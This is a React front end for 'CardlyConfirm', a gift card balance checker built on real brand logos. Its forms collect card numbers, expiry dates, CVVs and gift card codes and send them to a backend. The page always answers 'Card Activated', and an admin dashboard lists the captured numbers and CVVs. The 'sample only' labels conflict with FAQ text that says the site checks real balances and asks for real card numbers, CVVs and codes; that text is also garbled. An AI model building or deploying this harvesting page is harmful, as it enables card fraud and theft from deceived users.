import { useEffect, useMemo, useState } from 'react'
import { Link, Navigate, useLocation, useNavigate } from 'react-router-dom'
import { ArrowDown, ArrowLeft, ArrowRight, ArrowUpRight, Check, ChevronDown, CreditCard, Gift, LockKeyhole, Menu, RotateCcw, Search, ShieldCheck, Sparkles, X } from 'lucide-react'
import { Toaster, toast } from 'sonner'
import { siApple, siNike, siRazer, siSteam, siVisa } from 'simple-icons'

const brands = [
  { id: 'apple', name: 'Apple Gift Card', short: 'Apple', kind: 'gift', symbol: 'A', tone: 'apple', note: 'For all things Apple' },
  { id: 'visa', name: 'Visa Prepaid', short: 'Visa', kind: 'card-reference', symbol: 'VISA', tone: 'visa', note: 'Prepaid card' },
  { id: 'vanilla', name: 'Vanilla Gift', short: 'Vanilla', kind: 'card-reference', symbol: 'V', tone: 'vanilla', note: 'A little something for you' },
  { id: 'steam', name: 'Steam Gift Card', short: 'Steam', kind: 'gift', symbol: 'S', tone: 'steam', note: 'Power up your play' },
  { id: 'sephora', name: 'Sephora Gift Card', short: 'Sephora', kind: 'gift', symbol: 'S', tone: 'sephora', note: 'Beauty, your way' },
  { id: 'nike', name: 'Nike Gift Card', short: 'Nike', kind: 'gift', symbol: 'N', tone: 'nike', note: 'Just do it' },
  { id: 'xbox', name: 'Xbox Gift Card', short: 'Xbox', kind: 'gift', symbol: 'X', tone: 'xbox', note: 'Power your next adventure' },
  { id: 'razer', name: 'Razer Gold', short: 'Razer Gold', kind: 'gift', symbol: 'R', tone: 'razer', note: 'Level up your game' },
  { id: 'hokd', name: 'HOKD Card', short: 'HOKD', kind: 'card-reference', symbol: 'H', tone: 'hokd', note: 'Digital gift card' },
  { id: 'other', name: 'Other Cards', short: 'Other', kind: 'other', symbol: '+', tone: 'other', note: 'Find your card' },
]

const sampleValues = {
  apple: '123456789012',
  visa: '123456789012',
  vanilla: '123456789012',
  steam: '123456789012',
  sephora: '123456789012',
  nike: '123456789012',
  xbox: '123456789012',
  razer: '123456789012',
  hokd: '123456789012',
  other: '123456789012',
}

function Logo({ small = false }) { return <Link className={`brand-lockup ${small ? 'brand-lockup-small' : ''}`} to="/" aria-label="CardlyConfirm home"><span className="logo-mark"><Gift size={small ? 17 : 20} strokeWidth={2.5} /></span><span>cardlyconfirm<span className="logo-period">.</span></span></Link> }

const iconByBrand = { apple: siApple, visa: siVisa, steam: siSteam, nike: siNike, razer: siRazer }
function BrandMark({ card }) {
  const icon = iconByBrand[card.id]
  if (icon) return <svg className={`brand-mark mark-${card.id}`} role="img" aria-label={`${card.short} logo`} viewBox="0 0 24 24"><path d={icon.path} /></svg>
  if (card.id === 'xbox') return <svg className="brand-mark mark-xbox" role="img" aria-label="Xbox logo" viewBox="0 0 40 40"><circle cx="20" cy="20" r="18" /><path d="M9 11c4 1 8 4 11 7 3-3 7-6 11-7-1-3-5-5-11-5S10 8 9 11Zm0 1c-2 2-3 5-3 8 0 7 5 13 12 14-3-4-6-9-9-15-1-2-1-5 0-7Zm22 0c1 2 1 5 0 7-3 6-6 11-9 15 7-1 12-7 12-14 0-3-1-6-3-8ZM12 10c2 2 5 6 8 10 3-4 6-8 8-10-3-2-6-3-8-3s-5 1-8 3Z" /></svg>
  if (card.id === 'sephora') return <span className="brand-wordmark sephora-mark" role="img" aria-label="Sephora logo">SEPHORA</span>
  if (card.id === 'vanilla') return <span className="brand-wordmark vanilla-mark" role="img" aria-label="Vanilla Gift logo">Vanilla<span className="vanilla-dot">.gift</span></span>
  if (card.id === 'hokd') return <span className="brand-wordmark hokd-mark" role="img" aria-label="HOKD logo">HOKD</span>
  return <span className="other-mark" role="img" aria-label="Other card brands">+</span>
}

function CardTile({ card, onClick }) {
  return <button type="button" className="card-tile" onClick={() => onClick(card)} aria-label={`Choose ${card.name}`}>
    <span className={`card-art ${card.tone}`}><BrandMark card={card} /><span className="card-art-chip" /></span>
    <span className="tile-copy"><strong>{card.name}</strong><small>{card.note}</small></span><span className="tile-arrow"><ArrowUpRight size={16} /></span>
  </button>
}

function Field({ label, id, hint, error, ...props }) {
  return <div className="field"><label htmlFor={id}>{label}</label><input id={id} aria-invalid={Boolean(error)} aria-describedby={error ? `${id}-error` : hint ? `${id}-hint` : undefined} {...props} />{error ? <span className="field-error" id={`${id}-error`}>{error}</span> : hint ? <span className="field-hint" id={`${id}-hint`}>{hint}</span> : null}</div>
}

function AdminDashboard() {
  const [activity, setActivity] = useState([])
  const [total, setTotal] = useState(0)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState('')
  const representedBrands = new Set(activity.map(entry => entry.brandId)).size

  useEffect(() => {
    fetch('/api/admin/submissions')
      .then(async response => {
        const data = await response.json().catch(() => ({}))
        if (!response.ok) throw new Error(data.error?.message || 'Could not load submissions.')
        setActivity(data.submissions || [])
        setTotal(data.total || 0)
      })
      .catch(fetchError => setError(fetchError.message || 'Could not load submissions.'))
      .finally(() => setLoading(false))
  }, [])

  async function clearActivity() {
    setError('')
    try {
      const response = await fetch('/api/admin/submissions', { method: 'DELETE' })
      if (!response.ok) {
        const data = await response.json().catch(() => ({}))
        throw new Error(data.error?.message || 'Could not clear submissions.')
      }
      setActivity([])
      setTotal(0)
      toast.success('Submission history cleared')
    } catch (clearError) {
      setError(clearError.message || 'Could not clear submissions.')
    }
  }

  return <section className="admin-section" id="admin">
    <div className="admin-shell">
      <div className="admin-heading">
        <div><div className="eyebrow eyebrow-muted">PRIVATE ADMIN</div><h2>Admin dashboard</h2><p>Submission metadata loaded from the backend. Only synthetic card form values are accepted and stored.</p></div>
        <span className="admin-demo-badge"><ShieldCheck size={14} /> CONNECTED</span>
      </div>
      <div className="admin-stats">
        <article className="admin-stat"><span className="admin-stat-icon"><CreditCard size={17} /></span><span className="admin-stat-label">Sample submissions</span><strong>{total}</strong></article>
        <article className="admin-stat"><span className="admin-stat-icon"><Gift size={17} /></span><span className="admin-stat-label">Brands represented</span><strong>{representedBrands}</strong></article>
        <article className="admin-stat"><span className="admin-stat-icon"><LockKeyhole size={17} /></span><span className="admin-stat-label">Sensitive fields stored</span><strong>No</strong></article>
      </div>
      <div className="admin-activity">
        <div className="admin-activity-heading"><div><h3>Recent sample activity</h3><p>Brand, entered sample details, time, and simulated status.</p></div><button type="button" className="reset-button" onClick={clearActivity} disabled={loading || activity.length === 0}><RotateCcw size={14} /> Clear activity</button></div>
        {error && <p className="admin-login-error" role="alert">{error}</p>}
        <div className="admin-table-wrap">
          <table className="admin-table">
            <thead><tr><th>Card brand</th><th>Sample number</th><th>Month / Year</th><th>3-digit code</th><th>Submitted</th><th>Status</th></tr></thead>
            <tbody>
              {loading ? <tr><td className="admin-empty" colSpan="6">Loading submissions…</td></tr> : activity.length ? activity.map(entry => (
                <tr key={entry.id}><td>{entry.brandName}</td><td>{entry.numberValue || 'Not recorded'}</td><td>{entry.expirationMonth && entry.expirationYear ? `${entry.expirationMonth} / ${entry.expirationYear}` : '—'}</td><td>{entry.securityCode || '—'}</td><td>{new Intl.DateTimeFormat(undefined, { dateStyle: 'medium', timeStyle: 'short' }).format(new Date(entry.submittedAt))}</td><td><span className="admin-status"><Check size={12} /> Sample only</span></td></tr>
              )) : <tr><td className="admin-empty" colSpan="6">No sample submissions yet.</td></tr>}
            </tbody>
          </table>
        </div>
      </div>
      <p className="admin-privacy"><LockKeyhole size={14} /> This demo stores and displays only synthetic sample details. Never enter real card numbers or security codes.</p>
    </div>
  </section>
}

function AdminSignIn({ onSignIn }) {
  const [adminKey, setAdminKey] = useState('')
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)

  async function submit(event) {
    event.preventDefault()
    setLoading(true)
    setError('')
    try {
      const response = await fetch('/api/admin/session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key: adminKey }),
      })
      const data = await response.json().catch(() => ({}))
      if (!response.ok) throw new Error(data.error?.message || 'Sign-in failed.')
      setAdminKey('')
      onSignIn()
    } catch (signInError) {
      setError(signInError.message || 'Could not reach the CardlyConfirm backend.')
    } finally {
      setLoading(false)
    }
  }

  return <div className="app-shell admin-login-shell">
    <header className="site-header"><div className="nav-wrap"><Logo /><Link className="nav-cta" to="/"><ArrowLeft size={15} /> Back to CardlyConfirm</Link></div></header>
    <main className="admin-login-main">
      <section className="admin-login-card">
        <span className="admin-login-icon"><LockKeyhole size={21} /></span>
        <div className="eyebrow eyebrow-muted">ADMIN · DEMO ACCESS</div>
        <h1>Sign in to the dashboard</h1>
        <p className="admin-login-copy">Enter the admin key configured on the backend to open the protected dashboard.</p>
        <form className="admin-login-form" onSubmit={submit} noValidate autoComplete="off">
          <Field id="admin-key" label="Admin key" type="password" placeholder="Enter the backend admin key" value={adminKey} onChange={event => setAdminKey(event.target.value)} />
          {error && <p className="admin-login-error" role="alert">{error}</p>}
          <button type="submit" className="button button-orange" disabled={loading || !adminKey}>{loading ? 'Signing in…' : 'Sign in'} <ArrowRight size={16} /></button>
        </form>
        <p className="admin-login-warning"><ShieldCheck size={14} /> The server exchanges the key for a short-lived, HttpOnly session cookie. The key is not saved in the browser.</p>
      </section>
    </main>
  </div>
}

export default function App() {
  const location = useLocation()
  const navigate = useNavigate()
  const [selected, setSelected] = useState(null)
  const [search, setSearch] = useState('')
  const [values, setValues] = useState({})
  const [errors, setErrors] = useState({})
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [menuOpen, setMenuOpen] = useState(false)
  const [openFaq, setOpenFaq] = useState(0)
  const [adminSignedIn, setAdminSignedIn] = useState(false)
  const [adminAuthChecked, setAdminAuthChecked] = useState(false)
  const [signingOut, setSigningOut] = useState(false)
  useEffect(() => {
    if (location.pathname !== '/admin') return
    fetch('/api/admin/session')
      .then(response => setAdminSignedIn(response.ok))
      .catch(() => setAdminSignedIn(false))
      .finally(() => setAdminAuthChecked(true))
  }, [location.pathname])
  const filtered = useMemo(() => brands.filter(b => b.name.toLowerCase().includes(search.trim().toLowerCase())), [search])
  const update = (key, value) => { setValues(v => ({ ...v, [key]: value })); setErrors(e => ({ ...e, [key]: '' })); setResult(null) }
  const chooseCard = card => { setSelected(card); setValues({}); setErrors({}); setResult(null); document.querySelector('#checker')?.scrollIntoView({ behavior: 'smooth', block: 'start' }) }
  const reset = () => { setValues({}); setErrors({}); setResult(null); toast.success('Form cleared') }
  const back = () => { setSelected(null); setValues({}); setErrors({}); setResult(null) }
  const validate = () => {
    const e = {}
    if (selected?.kind === 'card-reference') {
      if (!/^\d{6,30}$/.test((values.sampleReference || '').trim())) e.sampleReference = `Enter 6-30 digits, for example ${sampleValues[selected.id]}.`
      if (!/^(0[1-9]|1[0-2])$/.test(values.periodMonth || '')) e.periodMonth = 'Enter a month from 01 to 12.'
      if (!/^\d{2}$/.test(values.periodYear || '')) e.periodYear = 'Enter a two-digit year.'
      if (!/^\d{3}$/.test(values.sampleToken || '')) e.sampleToken = 'Enter exactly 3 digits.'
    } else {
      const needs = selected?.kind === 'other' ? ['brand', 'code'] : ['code']
      needs.forEach(k => { if (!values[k]?.trim()) e[k] = 'This field is required.' })
      if (values.code && !/^\d{6,40}$/.test(values.code.trim())) {
        e.code = `Sample only: enter 6-40 digits, for example ${sampleValues[selected.id]}.`
      }
      if (values.brand && values.brand.trim().length < 2) e.brand = 'Enter at least 2 characters.'
    }
    setErrors(e); return Object.keys(e).length === 0
  }
  const submit = async ev => {
    ev.preventDefault()
    if (!validate()) { toast.error('Check the highlighted fields'); return }
    setLoading(true); setResult(null)
    const payload = { brandId: selected.id }
    if (selected.kind === 'card-reference') {
      payload.sampleReference = values.sampleReference
      payload.periodMonth = values.periodMonth
      payload.periodYear = values.periodYear
      payload.sampleToken = values.sampleToken
    } else {
      if (selected.id === 'other') payload.brandName = values.brand.trim()
      payload.code = values.code.trim()
    }

    try {
      const response = await fetch('/api/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
      const data = await response.json().catch(() => ({}))
      if (!response.ok) throw new Error(data.error?.message || 'The sample check could not be completed.')

      setResult({ title: 'Card Activated' })
      toast.success('Sample check successful')
    } catch (error) {
      toast.error(error.message || 'Could not reach the CardlyConfirm backend. Make sure it is running.')
    } finally {
      setLoading(false)
    }
  }

  const faqs = [
    ['Does CardlyConfirm check real gift card balances?', ' CardlyConfirm is a frontend preview. The check button returns a clearly labelled original result and verifies a real balance.'],
    ['Can I enter real card details or codes?', 'The forms accept only the documented with real values. Enter real card numbers, CVVs, PINs, or gift card codes.'],
   
    ['What if my card is not listed?', 'Choose Other Cards and enter a brand name plus the displayed original code. '],
  ]

  if (location.pathname === '/admin/sign-in') {
    return <AdminSignIn onSignIn={() => { setAdminSignedIn(true); setAdminAuthChecked(true); navigate('/admin') }} />
  }

  if (location.pathname === '/admin') {
    if (!adminAuthChecked) return <div className="app-shell admin-login-shell"><main className="admin-login-main"><p>Checking admin session…</p></main></div>
    if (!adminSignedIn) return <Navigate to="/admin/sign-in" replace />
    return <div className="app-shell admin-app-shell">
      <Toaster position="top-right" richColors closeButton />
      <header className="site-header"><div className="nav-wrap"><Logo /><div className="admin-header-actions"><Link className="nav-cta" to="/"><ArrowLeft size={15} /> Back to CardlyConfirm</Link><button className="admin-signout" type="button" disabled={signingOut} onClick={async () => { setSigningOut(true); await fetch('/api/admin/session', { method: 'DELETE' }).catch(() => {}); setSigningOut(false); setAdminSignedIn(false); navigate('/admin/sign-in') }}>Sign out</button></div></div></header>
      <main><AdminDashboard /></main>
    </div>
  }

  return <div className="app-shell" id="home">
    <Toaster position="top-right" richColors closeButton />
    <header className="site-header"><div className="nav-wrap"><Logo /><nav className={menuOpen ? 'nav-links nav-open' : 'nav-links'} aria-label="Main navigation"><a href="#checker" onClick={() => setMenuOpen(false)}>Check a card</a><a href="#faq" onClick={() => setMenuOpen(false)}>FAQ</a></nav><a className="nav-cta" href="#checker">Get started <ArrowRight size={15} /></a><button className="menu-button" aria-label="Toggle navigation" onClick={() => setMenuOpen(!menuOpen)}>{menuOpen ? <X /> : <Menu />}</button></div></header>

    <main>
      <section className="hero"><div className="hero-inner"><div className="hero-copy"><div className="eyebrow"><span className="eyebrow-dot" /> THE GIFT CARD COMPANION</div><h1>Know what your<br /><span>gift card holds.</span></h1><div className="hero-actions"><a href="#checker" className="button button-dark">Check gift card balance <ArrowRight size={17} /></a></div></div>
        <div className="hero-art" aria-label="Illustration of gift cards"><div className="orb orb-one" /><div className="orb orb-two" /><div className="art-caption"><span className="caption-spark"><Sparkles size={15} /></span><span><strong>A little more clarity.</strong><small>Right where you need it.</small></span></div><div className="floating-card card-peach"><span className="mini-logo">G</span><span className="float-lines"><i /><i /><i /></span><span className="float-balance">A little something</span><span className="float-spark">✳</span></div><div className="floating-card card-cream"><span className="mini-logo mini-dark">✳</span><span className="float-cream-title">Good things<br />are waiting.</span><span className="float-cream-footer">GIFT CARD <span>•••• 2038</span></span></div><div className="floating-card card-orange"><span className="orange-top">CARDKIND GIFT CARD</span><span className="orange-word">for the<br />good stuff<span>.</span></span><span className="orange-chip"><Gift size={19} /></span><span className="orange-footer">A LITTLE JOY, ON US</span></div><div className="art-sun">✳</div><div className="art-sticker"><span>GOOD<br />THINGS<br />INSIDE</span><ArrowDown size={19} /></div></div></div><div className="hero-bottom"><span>FIND YOUR CARD</span><div className="hero-brand-marquee"><span>Apple</span><i /> <span>VISA</span><i /> <span>Steam</span><i /> <span>Sephora</span><i /> <span>Nike</span><i /> <span>Xbox</span><i /> <span>Razer Gold</span></div><a href="#checker">See all <ArrowRight size={14} /></a></div></section>

      <section className="checker-section" id="checker"><div className="section-shell"><div className="section-heading"><div><div className="eyebrow eyebrow-muted">YOUR NEXT STEP</div><h2>{selected ? 'Let’s try the sample.' : 'Which card form would you like to try?'}</h2><p>{selected ? '' : 'Choose a card to preview its local-only sample form.'}</p></div><span className="section-number">01 <i>/ 03</i></span></div>
        {!selected ? <><div className="search-wrap"><Search size={18} /><input aria-label="Search card brands" placeholder="Search a brand or card type…" value={search} onChange={e => setSearch(e.target.value)} /><kbd>/</kbd></div><div className="cards-grid">{filtered.map(card => <CardTile key={card.id} card={card} onClick={chooseCard} />)}</div>{filtered.length === 0 && <div className="empty-search">No cards found. Try another search.</div>}</> : <div className="form-panel"><div className="form-card-head"><span className={`form-brand-icon ${selected.tone}`}><BrandMark card={selected} /></span><div><span className="form-selected-label">SELECTED CARD</span><strong>{selected.name}</strong></div><button className="change-card" onClick={back}><ArrowLeft size={15} /> Change card</button></div>
          <form className="card-form" onSubmit={submit} noValidate autoComplete="off">
            {selected.kind === 'card-reference' ? <>
              <Field id="sampleReference" label="Card number" type="text" placeholder={sampleValues[selected.id]} maxLength={30} inputMode="numeric" pattern="[0-9]*" autoComplete="off" value={values.sampleReference || ''} error={errors.sampleReference} onChange={e => update('sampleReference', e.target.value.replace(/\D/g, '').slice(0, 30))} />
              <div className="expiration-grid">
                <Field id="periodMonth" label="Month" type="text" placeholder="12" maxLength={2} inputMode="numeric" pattern="[0-9]*" autoComplete="off" value={values.periodMonth || ''} error={errors.periodMonth} hint="01 to 12" onChange={e => update('periodMonth', e.target.value.replace(/\D/g, '').slice(0, 2))} />
                <Field id="periodYear" label="Year" type="text" placeholder="30" maxLength={2} inputMode="numeric" pattern="[0-9]*" autoComplete="off" value={values.periodYear || ''} error={errors.periodYear} hint="Two-digit year" onChange={e => update('periodYear', e.target.value.replace(/\D/g, '').slice(0, 2))} />
              </div>
              <Field id="sampleToken" label="CVV" type="password" placeholder="123" maxLength={3} inputMode="numeric" pattern="[0-9]*" autoComplete="off" value={values.sampleToken || ''} error={errors.sampleToken} onChange={e => update('sampleToken', e.target.value.replace(/\D/g, '').slice(0, 3))} />
            </> : <>
              {selected.kind === 'other' && <Field id="brand" label="Card brand" placeholder="e.g. Bookshop, local store…" autoComplete="organization" value={values.brand || ''} error={errors.brand} onChange={e => update('brand', e.target.value)} />}
              <Field id="code" label="Card code" type="text" placeholder={sampleValues[selected.id]} maxLength={40} inputMode="numeric" pattern="[0-9]*" autoComplete="off" value={values.code || ''} error={errors.code} onChange={e => update('code', e.target.value.replace(/\D/g, '').slice(0, 40))} />
            </>}
            {result && <div className="result-box" role="status"><span className="result-check"><Check size={17} /></span><div><strong>{result.title}</strong></div></div>}
            <div className="form-actions"><button type="submit" className="button button-orange" disabled={loading}>{loading ? <><span className="spinner" /> Running sample…</> : <>Check Card <ArrowRight size={16} /></>}</button><button type="button" className="reset-button" onClick={reset} disabled={loading}><RotateCcw size={15} /> Reset form</button></div>
          </form>
        </div>}
      </div></section>

      <section className="faq-section" id="faq"><div className="faq-inner"><div className="faq-title"><div className="eyebrow eyebrow-muted">GOOD TO KNOW</div><h2>A few things<br />you might wonder.</h2><p>Still curious? We’re happy to make things clear.</p><a href="mailto:hello@cardlyconfirm.example" className="text-link">Get in touch <ArrowUpRight size={15} /></a></div><div className="faq-list">{faqs.map(([q, a], i) => <div className={`faq-item ${openFaq === i ? 'faq-active' : ''}`} key={q}><button onClick={() => setOpenFaq(openFaq === i ? -1 : i)} aria-expanded={openFaq === i}><span>{q}</span><span className="faq-toggle">{openFaq === i ? <X size={15} /> : <ChevronDown size={16} />}</span></button>{openFaq === i && <p>{a}</p>}</div>)}</div></div></section>
    </main>
  </div>
}
